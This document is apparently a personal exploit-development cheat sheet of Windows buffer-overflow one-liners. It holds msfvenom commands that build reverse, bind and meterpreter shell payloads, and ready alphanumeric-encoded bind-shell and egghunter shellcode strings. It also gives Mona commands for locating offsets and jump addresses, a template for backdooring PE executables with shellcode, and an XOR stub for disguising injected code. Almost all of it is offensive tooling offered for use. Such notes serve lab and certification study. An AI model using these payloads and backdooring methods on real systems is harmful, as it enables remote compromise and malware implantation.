# References
tidbits and one liners

# MSFVENOM
```
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -n 20 -f hex
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.119.137 LPORT=4444 -b "\x00\x20\x3f\x4f" -f c
msfvenom -p windows/shell_bind_tcp LPORT=4444 EXITFUNC=thread -b '\x00' -f hex
msfvenom -p windows/exec cmd=calc.exe -b "\x00\x0a" -f c
msfvenom -p generic/custom PAYLOADFILE=egg.bin -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows
msfvenom -p windows/shell_bind_tcp LPORT=4444 -e x86/alpha_mixed -a x86 --platform windows -f py -v shellcode
msfvenom -p windows/shell_bind_tcp -f python -v shellcode -a x86 --platform windows -e x86/unicode_upper BufferRegister=EAX
cat egg.bin | msfvenom -a x86 --platform windows -e x86/alpha_mixed -f py
```

# Alpha2
```
./msfpayload win32_bind LPORT=4444 R |./alpha2 eax --unicode --uppercase
PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLRJZKPMK8L9KOKOKOQPTKRLMTO4DKPEOLDKCLKUCHM1ZOTKPOLXDK1OMPKQJKPITKP4DKM1JNNQY0DY6LTDWPBTKWY1HJLMKQI2JKZTOK0TO4NH2UJE4KQOO4KQZKS6TKLLPKTKQOMLM1JKLCNLTK3Y2LMTMLQQWSP19KS44KPCNPTKOPLLDK40ML6MTKOPKXQNS8TNPNLNZLR0KOXVQVQC361XP3NR38D7T3P2QO24KOJ0S88KJMKLOKPPKOHV1O599U1VSQZMKXKRB5QZLBKOHPQXYILIJUFM0WKO8VQC0SQCPS0SPCPSOSPSKOJ0QVQXLQQLC6R3SY9QF5C86DMJ40I7QGKOXVQZN00Q0UKOZ0RHVD6MNNYY27KOIFQCQEKOXP2HYUQ9SV191GKOYF0P0TPTPUKO8PV3QXYWD9Y6T9PWKOJ6PUKO8PS62J1TC6QXS3RM59K52JB029MYXL59JG2JPDSYYRP1WPL3FJKNORNMKN12NL5CTMSJP8VKFKVKS82RKNWCLVKO2U14KO9FQK1GR2B1PQR1RJKQPQPQ25PQKOJ0QX6M9IKUXNPSKOYFBJKOKONWKOZ04KR7KL3SWTQTKOIFR2KOZ02HL0SZM4QO0SKO9FKO8PA
```
```
msf-egghunter -f raw -e 'w00t' > /tmp/egg.bin
./alpha2 ecx --uppercase < /tmp/egg.bin
or
msf-egghunter -f raw -e 'w00t' | alpha2 ecx --uppercase
egghunter = "IIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI3VK18JKODOG2PRBJS2F8XM6NWLUUQJ2TJOOH2WP06P44MYXWNO45JJNOCEM7KOZGA"
```
```
msfpayload win32_bind LPORT=4444 R > bindshell-4444.raw
/opt/alpha2/alpha2 ecx --uppercase < /usr/share/framework2/bindshell-4444.raw
shellcode = "IIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKL2JZKPMM8L9KOKOKO3PLK2LWTQ4LKW5WLLKSLS5CHUQJOLKPO4XLKQO7PUQJK1YLK6TLK31JN01O0MINLK4IP44TGIQ8JTM5QO2ZKZTGKPTVDVHD5M5LKQO14UQZKRFLKTLPKLKQOELUQJK4CFLLKMYRLWTELSQO3VQYKSTLKG3P0LK1PTLLKRP5LNMLKQP4H1NSXLN0N4NJLPPKON63VV32FSXFSWBRH472SVR1OPTKOXPSX8KJMKLGKPPKOXVQOK9M52FK1JMS8DB653ZC2KOXP2HYIC9L5NMQGKOYFF3F3PSPSPSPC0SQSQCKOXPSV3XDQQLCV63MYKQLUE8Y4UJ2PYWPWKON6RJ200QF5KON02HOTNM6NZIPWKOHVPS65KON0RHKU0IMVQY0WKO8V0PV4PTV5KO8PLS3XM73IO6D9F7KON61EKO8PRF2JE4U6583SBMMYM53ZPP0Y7YHLMYKW3Z0DK9KRFQ9PZSNJKN1RFMKNQRVLLSLMRZ6XNKNKNKRHSBKNH34VKORUQTKO8VQKPW62V10Q0QSZEQPQPQPU0QKON0SXNMYIC5HNQCKOIFRJKOKOFWKOXPLKQGKLMSYTU4KON6QBKOXPE8JPMZ5TQOF3KOIFKO8PA"
```

# Egg Hunter w/o specific bytes
```
msf-egghunter -f raw -e dead | msfvenom -p - --platform windows -a x86 -b '\x2e' -f python -v egghunter
msf-egghunter -a x86 -f raw -e w00t -b '\x00' | msfvenom -p - -a x86 --platform windows -b "\x00" -e x86/alpha_mixed -f python
cat egg.bin | msfvenom -a x86 --platform windows -e x86/alpha_mixed -f py
```
#
```
cat shellcode.bin | msfvenom -p - windows/exec CMD=calc.exe -e x86/alpha_mixed -f python
```

# Another Egg 
```
because of the bad characters getting mangled.  We can copy these bytes to egg.bin.
# 6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7 # use replace in nano
# echo A> egg.bin
# hexedit egg.bin   # copy the above bytes into this file and ensure no extra characters are there.
# Then we can encode this egg hunter we already created into alphanumeric (no special bytes, only letters and numbers.
# 126 byte egg hunter.
#
# cat egg.bin | msfvenom -a x86 --platform windows -e x86/alpha_mixed -f py
```

# One-liner to convert to bin file
```
egghunter.rb  -f raw  -e b00b | xxd  |awk -F":" '{print $2}' |sed 's/ //g' |awk '{print substr($0,0,32)}' | sed 's/\(..\)/\\x\1/g' |tac
```

# Hexdump files in 4bytes chunks; uselful if you want to (alphanum) encode a payload with SUB or ADD
```
hexdump -e '4/1 "%02X" "\n"' FILE
```

# Switch around an address to little endian (python), helpful when your brain won't work
```
a = '0040A76F'
"".join(reversed([a[i:i+2] for i in range(0, len(a), 2)]))
output: '6FA74000'
```

# Look out for \xCC
```
# debugger no likey
```


# Hex bytes only
```
msfpayload win32_reverse LHOST=127.0.0.1 EXITFUNC=thread LPORT=1337 -b  "\x00" C | grep '"' |tr -d " " |tr -d "\n" |sed 's/[\"x;]//g'
```

# Mona
```
# Pattern create 5000 bytes
!mona pc 5000									                

# Find offet of string dj0d
!mona po dj0d									                

# Find 
!mona findmsp									                

!mona jmp -r ESP

# Stick an address in EAX when restricted by characters
!mona encode -t alphanum -s '\xa9\xfa\x12\x00'

# Generate bad characters, minus \x00
!mona bytearray -b '\x00'						          

# Compare full list of characters with output from register
!mona compare -f bytearray.bin -a 01A4F9E0		

# List all loaded modules and information about them
!mona modules									                

# Look for 'jmp esp' in essfunc.dll module
!mona find -s "\xff\xe4" -m essfunc.dll	  		

# Unicode venetian aligment stub
!mona unicodealign   # if EIP points to the start address already

# Set Mona Working Directory
!mona config -set workingfolder c:\monalogs
```

# Backdoor PE Files General Syntax
```
PUSHAD                 # Save the register values 
PUSHFD                 # Save the flag values  
shellcode              # Pick your poisen
align stack            # Align ESP with where we saved our stack registers! 
POPFD                  # Restore the original register values 
POPAD                  # Restore the original flag values 
CALL dddd32.0041B7DE   # The first instruction we overwrote (hijack) 
JMP 00411363           # Jump to the command that was to be executed next
```
# This guy
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key thisiskey -f c
```

# XOR Stub Syntax
```
0040A770   MOV EAX, 004050ca         # Save start of encoding address in EAX 
0040A775   XOR BYTE PTR DS:[EAX],dF  # XOR the contents of EAX with XOR key dF 
0040A778   INC EAX                   # Increase EAX 
0040A779   CMP EAX, 0040A76F         # Have we reached the end enc. address? 
0040A77E   JLE SHORT 0040A775        # If not, jump back to XOR command 
0040A780   PUSH EBP                  # If you have, restore 1st hijacked command 
0040A781   MOV EBP,ESP               # Restore 2nd hijacked command 
0040A783   PUSH -1                   # Restore other instructions if needed 
0040A785   JMP 00404C05              # Jump to where we left off from. 
```

# Negative Jump 176 bytes (minus the opcodes) --> Perfect for an encoded egghunter
```
83EC 58                     SUB ESP,58 
83EC 58                     SUB ESP,58 
FFE4                        JMP ESP
```

# Other conditional jumps
```
77 08   JA SHORT 00B8FFE6
76 06   JBE SHORT 00B8FFE6
```
```
019BFFC4   4C               DEC ESP
019BFFC5   4C               DEC ESP
019BFFC6  ^77 80            JA SHORT 019BFF48
```

# A Much Bigger Jump (400+ bytes), Phrack #62 Article 7 by Aaron Adams 
```
D9EE           FLDZ
D97424 F4      FSTENV (28-BYTE) PTR SS:[ESP-C]
59             POP ECX
80C1 0A        ADD CL,0A
90             NOP
FECD           DEC CH
FECD           DEC CH
FFE1           JMP ECX
```

# Zero out EAX
```
AND EAX,554E4D4A      
AND EAX,2A313235 
```
```
XOR EAX,EAX
```

# Copy ESP Address to EAX to Start Working
```
54               PUSH ESP
58               POP EAX
```

# Align shellcode to multiple of 16
```
shellcode =  ""
shellcode += "w00tw00t"                     # egg
shellcode += "\x57\x5c"                     # push edi; pop esp
shellcode += "\x81\xe4\xf0\xff\xff\xff"    # align the stack: AND esp,0xFFFFFFF0
...
```

# Good ol TTY Shell
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

# Quick Debugging Shortcuts
```
Ctrl+F2 --> Ctrl+G --> Enter   --> F2             --> F9 
restart --> go to last address --> set breakpoint --> run
```

# Random tricks that comes in handy
```
MOV EBX, 0x40343444   ; Set EBX to a mostly correct address
SHR EBX, 0x8          ; Shift EBX right by a byte to correct the address
```
```
MOV AL, 6             ; Set EAX to 6
PUSH EAX
```
```
sub ax, 406           ; subtract 406 bytes from current ax value
add ax, 406           ; add 406 bytes to current ax value
```
